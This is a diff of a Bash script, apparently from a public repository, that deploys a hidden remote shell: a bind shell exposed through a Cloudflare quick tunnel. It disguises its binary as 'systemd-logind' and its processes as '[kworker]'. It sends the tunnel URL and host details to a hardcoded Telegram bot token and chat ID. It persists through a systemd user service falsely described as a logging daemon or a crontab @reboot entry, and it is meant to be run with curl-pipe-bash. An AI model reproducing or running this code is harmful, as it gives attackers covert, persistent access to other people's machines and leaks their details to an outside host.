@@ -1,172 +1,244 @@
 #!/usr/bin/env bash
-# Cloudflare Tunnel Reverse Shell (like gsocket) – Final Fix
-# Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
-# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
+# Cloudflare Tunnel Reverse Shell Persistence (like gsocket) with Telegram Notifications
+# Usage: bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
+# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
 
-# ---------- Konfigurasi ----------
+# ========== KONFIGURASI ==========
 : "${HOME:=/tmp}"
 : "${USER:=$(whoami 2>/dev/null || echo unknown)}"
 : "${UID:=$(id -u 2>/dev/null || echo 0)}"
 
-# Telegram (hardcode)
-TG_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
-TG_CHATID="6223261018"
-
-BIN_NAME="systemd-logind"
-PROC_NAME="[kworker]"
+BIN_HIDDEN_NAME="systemd-logind"
+PROC_HIDDEN_NAME="[kworker]"
 CONFIG_DIR=".config/dbus"
 URL_BASE="https://github.com/cloudflare/cloudflared/releases/latest/download"
 TMPDIR="/tmp/.cf-${UID}"
+mkdir -p "$TMPDIR" 2>/dev/null || true
 PORT=$((RANDOM % 40000 + 10000))
 
-# ---------- Fungsi ----------
-log() { echo "[*] $*" >&2; }
-err()  { echo "[!] $*" >&2; exit 1; }
+# Telegram Bot Configuration
+TELEGRAM_TOKEN="8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
+TELEGRAM_CHAT_ID="6223261018"
 
-# Kirim ke Telegram (opsional)
-send_tg() {
-    local url="$1"
-    local msg="✅ Reverse shell: ${url}%0AHost: $(hostname)%0AUser: ${USER}%0APort: ${PORT}"
-    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
-        -d "chat_id=${TG_CHATID}&text=${msg}" >/dev/null 2>&1 || true
+set -euo pipefail
+
+# ========== FUNGSI UTIL ==========
+error() { echo -e "\033[1;31m$*\033[0m" >&2; }
+info()  { echo -e "\033[1;32m$*\033[0m" >&2; }
+warn()  { echo -e "\033[1;33m$*\033[0m" >&2; }
+
+cleanup() {
+    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR" 2>/dev/null || true
+}
+trap cleanup EXIT
+
+send_telegram() {
+    local message="$1"
+    local url="https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage"
+    if command -v curl >/dev/null; then
+        curl -s -X POST "$url" -d chat_id="$TELEGRAM_CHAT_ID" -d text="$message" >/dev/null 2>&1
+    elif command -v wget >/dev/null; then
+        wget -q -O /dev/null --post-data="chat_id=$TELEGRAM_CHAT_ID&text=$message" "$url" 2>/dev/null
+    fi
 }
 
+# ========== DETEKSI ARSITEKTUR ==========
 detect_arch() {
     local arch=$(uname -m)
     local os=$(uname -s | tr '[:upper:]' '[:lower:]')
     case "$os" in
         linux)  os="linux" ;;
         darwin) os="darwin" ;;
-        *)      err "Unsupported OS: $os" ;;
+        *)      error "Unsupported OS: $os"; exit 1 ;;
     esac
     case "$arch" in
-        x86_64|amd64) echo "linux-amd64" ;;
-        aarch64|arm64) echo "linux-arm64" ;;
-        armv7l)        echo "linux-arm" ;;
-        i386|i686)     echo "linux-386" ;;
-        *) err "Unsupported arch: $arch" ;;
+        x86_64|amd64) arch="amd64" ;;
+        aarch64|arm64) arch="arm64" ;;
+        armv7l)        arch="arm" ;;
+        i386|i686)     arch="386" ;;
+        *) error "Unsupported arch: $arch"; exit 1 ;;
     esac
+    echo "${os}-${arch}"
 }
 
-download_cf() {
+# ========== DOWNLOAD CLOUDFLARED ==========
+download_cloudflared() {
     local arch="$1"
     local url="${URL_BASE}/cloudflared-${arch}"
     local out="$TMPDIR/cloudflared"
-    log "Downloading cloudflared for ${arch}..."
-    curl -fsSL -o "$out" "$url" || err "Download failed"
+    info "Downloading cloudflared for ${arch}..."
+    if command -v curl >/dev/null; then
+        curl -fsSL -o "$out" "$url" || { error "Download failed"; exit 1; }
+    elif command -v wget >/dev/null; then
+        wget -q -O "$out" "$url" || { error "Download failed"; exit 1; }
+    else
+        error "Need curl or wget"; exit 1
+    fi
     chmod 755 "$out"
     echo "$out"
 }
 
+# ========== BIND SHELL (Tersembunyi) ==========
 start_bindshell() {
     local port="$1"
-    local cmd
+    local bind_cmd
     if command -v socat >/dev/null; then
-        cmd="socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
+        bind_cmd="exec -a '$PROC_HIDDEN_NAME' socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
     elif command -v ncat >/dev/null; then
-        cmd="ncat -lvvk ${port} -e /bin/bash --allow 127.0.0.1"
+        bind_cmd="exec -a '$PROC_HIDDEN_NAME' ncat -lvvk ${port} -e /bin/bash --allow 127.0.0.1"
     elif command -v nc >/dev/null && nc -h 2>&1 | grep -q -e '-e'; then
-        cmd="nc -l -p ${port} -e /bin/bash"
+        bind_cmd="exec -a '$PROC_HIDDEN_NAME' nc -l -p ${port} -e /bin/bash"
     else
-        cmd="bash -c 'while true; do nc -l -p ${port} -e /bin/bash 2>/dev/null; done'"
+        bind_cmd="exec -a '$PROC_HIDDEN_NAME' bash -c 'while true; do nc -l -p ${port} -e /bin/bash 2>/dev/null; done'"
     fi
-    nohup sh -c "$cmd" &>/dev/null &
+    nohup bash -c "$bind_cmd" &>/dev/null &
     echo $!
 }
 
+# ========== START TUNNEL (Tersembunyi) ==========
 start_tunnel() {
     local port="$1"
     local bin="$2"
     local url_file="$3"
-    # Jalankan tunnel dengan nama tersembunyi
-    ( exec -a "$PROC_NAME" "$bin" tunnel --url "tcp://localhost:${port}" ) 2>&1 | while IFS= read -r line; do
+    (
+        exec -a "$PROC_HIDDEN_NAME" "$bin" tunnel --url "tcp://localhost:${port}" 2>&1
+    ) | while IFS= read -r line; do
         if [[ "$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
             url="${BASH_REMATCH[0]}"
             echo "$url" > "$url_file"
-            # CETAK KE STDOUT (agar langsung terlihat)
-            echo "$url"
-            # Kirim juga ke Telegram
-            send_tg "$url"
+            echo -e "\n\033[1;32m✅ TUNNEL URL: $url\033[0m" >&2
+            echo -e "Connect with:\n  cloudflared access tcp --hostname $url --url localhost:4444 && nc localhost 4444\n" >&2
+            send_telegram "✅ Tunnel Active%0AURL: $url%0APort: $port%0AUser: $USER%0AHost: $(hostname)" 2>/dev/null || true
         fi
         echo "$line" >> "$TMPDIR/cloudflared.log"
     done &
     echo $!
 }
 
+# ========== PERSISTENCE (dengan Telegram) ==========
 install_persistence() {
     local bin_path="$1"
     local port="$2"
-    local script_path="${HOME}/${CONFIG_DIR}/cf_tunnel.sh"
-    mkdir -p "${HOME}/${CONFIG_DIR}"
+    local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
+    local service_name="cf-tunnel"
+    mkdir -p "${HOME}/.${CONFIG_DIR}"
+
     cat > "$script_path" <<EOF
 #!/bin/bash
+# Persistence tunnel with Telegram notification
+
+TELEGRAM_TOKEN="$TELEGRAM_TOKEN"
+TELEGRAM_CHAT_ID="$TELEGRAM_CHAT_ID"
+PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME"
+BIN_PATH="$bin_path"
+PORT="$port"
+TMPDIR="$TMPDIR"
+
+send_telegram() {
+    local message="\$1"
+    local url="https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage"
+    if command -v curl >/dev/null; then
+        curl -s -X POST "\$url" -d chat_id="\$TELEGRAM_CHAT_ID" -d text="\$message" >/dev/null 2>&1
+    elif command -v wget >/dev/null; then
+        wget -q -O /dev/null --post-data="chat_id=\$TELEGRAM_CHAT_ID&text=\$message" "\$url" 2>/dev/null
+    fi
+}
+
 while true; do
-    ( exec -a "$PROC_NAME" "$bin_path" tunnel --url "tcp://localhost:${port}" ) 2>&1 | while IFS= read -r line; do
+    # Jalankan tunnel dan capture output
+    exec -a "\$PROC_HIDDEN_NAME" "\$BIN_PATH" tunnel --url "tcp://localhost:\${PORT}" 2>&1 | while IFS= read -r line; do
         if [[ "\$line" =~ https://([a-z0-9-]+)\.trycloudflare\.com ]]; then
             url="\${BASH_REMATCH[0]}"
-            echo "\$url" > "$TMPDIR/tunnel.url"
-            curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
-                -d "chat_id=${TG_CHATID}&text=✅ Reverse shell restarted: \${url}%0AHost: \$(hostname)%0AUser: ${USER}" >/dev/null 2>&1
+            echo "\$url" > "\$TMPDIR/tunnel.url"
+            send_telegram "🔄 Tunnel Restarted%0AURL: \$url%0APort: \$PORT%0AUser: $USER%0AHost: $(hostname)"
         fi
-        echo "\$line" >> "$TMPDIR/cloudflared.log"
+        echo "\$line" >> "\$TMPDIR/cloudflared.log"
     done
     sleep 10
 done
 EOF
     chmod 755 "$script_path"
-    # Pasang ke crontab (reboot)
-    (crontab -l 2>/dev/null | grep -v "cf_tunnel.sh"; echo "@reboot $script_path") | crontab - 2>/dev/null || true
-    log "Persistence via crontab installed."
+
+    # Install persistence
+    if command -v systemctl >/dev/null && systemctl --user --version &>/dev/null; then
+        mkdir -p "${HOME}/.config/systemd/user"
+        cat > "${HOME}/.config/systemd/user/${service_name}.service" <<EOF
+[Unit]
+Description=System Logging Daemon
+After=network.target
+
+[Service]
+ExecStart=$script_path
+Restart=always
+RestartSec=10
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=default.target
+EOF
+        systemctl --user daemon-reload
+        systemctl --user enable "$service_name"
+        systemctl --user start "$service_name"
+        info "Persistence via systemd user service installed."
+    elif command -v crontab >/dev/null; then
+        (crontab -l 2>/dev/null; echo "@reboot $script_path") | crontab - 2>/dev/null || true
+        info "Persistence via crontab installed."
+    else
+        warn "No persistence method found. Tunnel will not survive reboot."
+    fi
 }
 
+# ========== UNINSTALL ==========
 uninstall() {
-    log "Uninstalling..."
-    pkill "$BIN_NAME" 2>/dev/null || true
-    pkill -f "$PROC_NAME" 2>/dev/null || true
+    info "Uninstalling..."
+    pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
+    pkill -f "$PROC_HIDDEN_NAME" 2>/dev/null || true
     pkill -f "cf_tunnel.sh" 2>/dev/null || true
     crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
-    rm -rf "${HOME}/${CONFIG_DIR}" "$TMPDIR"
-    log "Uninstall complete."
+    if command -v systemctl >/dev/null; then
+        systemctl --user stop cf-tunnel.service 2>/dev/null || true
+        systemctl --user disable cf-tunnel.service 2>/dev/null || true
+        rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
+    fi
+    rm -rf "${HOME}/.${CONFIG_DIR}"
+    rm -rf "$TMPDIR"
+    info "Uninstall complete."
     exit 0
 }
 
-# ---------- MAIN ----------
+# ========== MAIN ==========
 [[ -n "${GS_UNDO:-}" ]] && uninstall
-
-# Bersihkan proses lama – gunakan pkill tanpa -f untuk binary
-pkill "$BIN_NAME" 2>/dev/null || true
-pkill -f "$PROC_NAME" 2>/dev/null || true
-pkill -f "cf_tunnel.sh" 2>/dev/null || true
-sleep 1
 
 rm -rf "$TMPDIR" 2>/dev/null || true
 mkdir -p "$TMPDIR"
 
 arch=$(detect_arch)
-cf_bin=$(download_cf "$arch")
+cf_bin=$(download_cloudflared "$arch")
 
-INSTALL_DIR="${HOME}/${CONFIG_DIR}"
+INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
 mkdir -p "$INSTALL_DIR"
-cp "$cf_bin" "$INSTALL_DIR/$BIN_NAME"
-chmod 755 "$INSTALL_DIR/$BIN_NAME"
-cf_bin="$INSTALL_DIR/$BIN_NAME"
+cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME"
+chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
+cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"
 
-log "Starting bind shell on port $PORT..."
+info "Starting bind shell on port $PORT..."
 bind_pid=$(start_bindshell "$PORT")
 sleep 1
 
-log "Starting Cloudflare tunnel..."
+info "Starting Cloudflare tunnel..."
 url_file="$TMPDIR/tunnel.url"
 tunnel_pid=$(start_tunnel "$PORT" "$cf_bin" "$url_file")
 sleep 5
 
+# Kirim notifikasi URL pertama
 if [[ -f "$url_file" ]]; then
-    url=$(cat "$url_file")
-    log "Tunnel URL: $url"
+    first_url=$(cat "$url_file")
+    send_telegram "✅ Tunnel Active (First Run)%0AURL: $first_url%0APort: $PORT%0AUser: $USER%0AHost: $(hostname)" 2>/dev/null || true
 else
-    log "Failed to get tunnel URL. Check $TMPDIR/cloudflared.log"
+    warn "Failed to get tunnel URL. Check $TMPDIR/cloudflared.log"
 fi
 
 [[ -z "${GS_NOINST:-}" ]] && install_persistence "$cf_bin" "$PORT"
 
-log "Done. Use GS_UNDO=1 to uninstall."
+info "Done. Use GS_UNDO=1 to uninstall."
